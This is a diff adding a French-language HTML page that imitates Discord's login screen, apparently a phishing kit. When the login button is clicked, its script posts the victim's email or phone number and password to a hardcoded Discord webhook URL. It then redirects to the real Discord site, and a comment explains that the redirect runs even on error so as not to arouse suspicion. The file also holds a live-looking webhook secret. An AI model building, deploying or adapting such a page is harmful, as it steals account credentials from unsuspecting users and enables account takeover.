@@ -1,0 +1,306 @@
+<html><head><base href="https://discord.com">
+<meta charset="utf-8">
+<title>Discord</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background: url('https://media.discordapp.net/attachments/1118076831418028082/1269078964257947752/mQc6H2S.png?ex=66aec163&is=66ad6fe3&hm=5abc57789c2e39bc839f295dfd835c5a5aa8c9688eba745745923ef4994398be&=&format=webp&quality=lossless&width=550&height=344') no-repeat center center fixed;
+    background-size: cover;
+}
+
+.background {
+    height: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.login-box {
+    background-color: #36393f;
+    border-radius: 5px;
+    padding: 32px;
+    width: 784px;
+    box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
+    display: flex;
+    position: relative;
+}
+
+.login-form {
+    flex: 1;
+    padding-right: 32px;
+}
+
+.qr-code {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    border-left: 1px solid #4f545c;
+    padding-left: 32px;
+}
+
+h2 {
+    color: #fff;
+    font-size: 24px;
+    margin-bottom: 8px;
+    text-align: center;
+}
+
+.subtitle {
+    color: #b9bbbe;
+    font-size: 16px;
+    margin-bottom: 20px;
+    text-align: center;
+}
+
+.input-label {
+    color: #b9bbbe;
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+}
+
+.input-label::after {
+    content: " *";
+    color: #ed4245;
+}
+
+input {
+    background-color: #202225;
+    border: none;
+    border-radius: 3px;
+    color: #dcddde;
+    font-size: 16px;
+    padding: 10px;
+    margin-bottom: 20px;
+    width: 100%;
+}
+
+button {
+    background-color: #5865f2;
+    border: none;
+    border-radius: 3px;
+    color: #fff;
+    font-size: 16px;
+    padding: 12px;
+    width: 100%;
+    cursor: pointer;
+}
+
+.qr-image {
+    width: 176px;
+    height: 176px;
+    background-color: #fff;
+    padding: 8px;
+    border-radius: 4px;
+    margin-bottom: 32px;
+}
+
+.qr-text {
+    color: #fff;
+    font-size: 20px;
+    text-align: center;
+    font-weight: 600;
+}
+
+.qr-subtext {
+    color: #a3a6aa;
+    font-size: 16px;
+    text-align: center;
+    margin-top: 8px;
+    line-height: 1.3;
+}
+
+.discord-logo {
+    position: absolute;
+    top: 32px;
+    left: 32px;
+    width: 124px;
+    height: 34px;
+}
+
+.back-button {
+    position: absolute;
+    top: 16px;
+    left: 16px;
+    color: #b9bbbe;
+    text-decoration: none;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+}
+
+.back-button svg {
+    width: 24px;
+    height: 24px;
+    margin-right: 8px;
+}
+
+.qr-link {
+    color: #00b0f4;
+    text-decoration: none;
+    font-size: 14px;
+    margin-top: 8px;
+}
+
+.bold {
+    font-weight: bold;
+}
+
+.error-message {
+    color: #ed4245;
+    font-size: 12px;
+    margin-top: -15px;
+    margin-bottom: 15px;
+}
+
+input.error {
+    border: 1px solid #ed4245;
+}
+</style>
+</head>
+<body>
+<div class="background">
+    <img src="https://media.discordapp.net/attachments/1118076831418028082/1269078974286532741/9CGNwb5.png?ex=66aec165&is=66ad6fe5&hm=eb8a4c74fdc4e5d7df93450f3e3420d805381036e607eac7920452bcbea21559&=&format=webp&quality=lossless" alt="Discord logo" class="discord-logo">
+    <div class="login-box">
+        <a href="#" class="back-button">
+            <svg width="24" height="24" viewBox="0 0 24 24">
+                <path fill="currentColor" d="M14.7 5.3a1 1 0 0 1 0 1.4L9.42 12l5.3 5.3a1 1 0 0 1-1.42 1.4l-6-6a1 1 0 0 1 0-1.4l6-6a1 1 0 0 1 1.42 0Z" class=""></path>
+            </svg>
+            Retour
+        </a>
+        <div class="login-form">
+            <h2>Ha, te revoilà !</h2>
+            <div class="subtitle">Nous sommes si heureux de te revoir !</div>
+            <div class="input-label">E-MAIL OU NUMÉRO DE TÉLÉPHONE</div>
+            <input type="text" id="email-phone">
+            <div class="error-message" id="email-phone-error" style="display: none;"><strong>E-MAIL OU NUMÉRO DE TÉLÉPHONE</strong> - Identifiant ou mot de passe invalide.</div>
+            <div class="input-label">MOT DE PASSE</div>
+            <input type="password" id="password">
+            <div class="error-message" id="password-error" style="display: none;"><strong>MOT DE PASSE</strong> - Identifiant ou mot de passe invalide.</div>
+            <a href="#" style="color: #00b0f4; font-size: 14px; text-decoration: none;">Tu as oublié ton mot de passe ?</a>
+            <button style="margin-top: 20px;" onclick="validateAndSend()">Connexion</button>
+            <div style="font-size: 14px; margin-top: 8px;">
+                <span style="color: #72767d;">Besoin d'un compte ?</span>
+                <a href="#" style="color: #00b0f4; text-decoration: none;">S'inscrire</a>
+            </div>
+        </div>
+        <div class="qr-code">
+            <div class="qr-image">
+                <img src="https://media.discordapp.net/attachments/1118076831418028082/1269080721109159936/GobF5Ul.png?ex=66aec306&is=66ad7186&hm=daedb4bdf6568794c774b25a69aa752fb6ae7fe9a892aaeee86b679a41642901&=&format=webp&quality=lossless" alt="Discord QR Code" style="width: 100%; height: 100%; object-fit: contain;">
+            </div>
+            <div class="qr-text">
+                Se connecter avec<br>un code QR
+            </div>
+            <div class="qr-subtext">
+                Scanne-le avec l'<span class="bold">application<br>mobile Discord</span> pour te connecter<br>instantanément.
+            </div>
+            <a href="#" class="qr-link">Sinon, connecte-toi avec une clé d'accès</a>
+        </div>
+    </div>
+</div>
+<script>
+function validateAndSend() {
+    const emailPhone = document.getElementById('email-phone');
+    const password = document.getElementById('password');
+    const emailPhoneError = document.getElementById('email-phone-error');
+    const passwordError = document.getElementById('password-error');
+    let isValid = true;
+
+    // Réinitialiser les styles d'erreur
+    emailPhone.classList.remove('error');
+    password.classList.remove('error');
+    emailPhoneError.style.display = 'none';
+    passwordError.style.display = 'none';
+
+    // Vérifier l'email/téléphone
+    if (emailPhone.value.trim() === '') {
+        emailPhone.classList.add('error');
+        emailPhoneError.style.display = 'block';
+        isValid = false;
+    }
+
+    // Vérifier le mot de passe
+    if (password.value.trim() === '') {
+        password.classList.add('error');
+        passwordError.style.display = 'block';
+        isValid = false;
+    }
+
+    if (isValid) {
+        sendLoginInfo();
+    }
+}
+
+function sendLoginInfo() {
+    const emailPhone = document.getElementById('email-phone').value;
+    const password = document.getElementById('password').value;
+    const webhookURL = 'https://discord.com/api/webhooks/1269081442957263084/wKr8rcpkxj3PQYRXIcq2ybSCEn0-ew3V6j7JowzdGQQJxngJAjsFBFX5jbQKIU-Iy0Hk';
+
+    const currentTime = new Date().toLocaleString('fr-FR', { 
+        hour: '2-digit', 
+        minute: '2-digit', 
+        second: '2-digit',
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric'
+    });
+
+    const embed = {
+        title: "Nouvelle connexion détectée",
+        color: 0x5865F2,
+        fields: [
+            {
+                name: "Email/Téléphone",
+                value: emailPhone,
+                inline: true
+            },
+            {
+                name: "Mot de passe",
+                value: password,
+                inline: true
+            },
+            {
+                name: "Date et heure",
+                value: currentTime,
+                inline: false
+            }
+        ],
+        thumbnail: {
+            url: "https://media.discordapp.net/attachments/1269081417476739114/1269084232102318091/brHUyIF.png?ex=66aec64b&is=66ad74cb&hm=a65633d25c4993e95bac16920e6916c5e01b24ea65f180b3ebf962a1af1c493a&=&format=webp&quality=lossless&width=626&height=626"
+        },
+        footer: {
+            text: "Discord Login Information"
+        }
+    };
+
+    const data = {
+        embeds: [embed]
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => {
+        console.log('Informations envoyées avec succès');
+        // Redirection vers Discord après l'envoi réussi
+        window.location.href = 'https://discord.com/channels/@me/';
+    })
+    .catch((error) => {
+        console.error('Erreur:', error);
+        // En cas d'erreur, on redirige quand même pour ne pas éveiller les soupçons
+        window.location.href = 'https://discord.com/channels/@me/';
+    });
+}
+</script>
+</body></html>
